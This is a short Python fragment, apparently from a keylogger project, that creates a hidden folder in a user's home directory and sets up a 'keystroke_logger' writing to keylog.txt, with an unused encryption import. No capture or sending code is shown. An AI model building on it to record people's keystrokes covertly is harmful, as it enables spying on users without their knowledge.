import logging
import os
from cryptography.fernet import Fernet
import os

log_dir = "/Users/mannatvirk/.hiddenfolder"
os.makedirs(log_dir, exist_ok=True)

def setup_logger(name, filename, level=logging.INFO, fmt='%(asctime)s: %(message)s'):
    logger = logging.getLogger(name)
    logger.setLevel(level)
    handler = logging.FileHandler(os.path.join(log_dir, filename))
    handler.setFormatter(logging.Formatter(fmt))
    logger.addHandler(handler)
    return logger

keystroke_logger = setup_logger('keystroke_logger', 'keylog.txt', fmt='%(message)s')
operation_logger = setup_logger('operation_logger', 'log.txt')

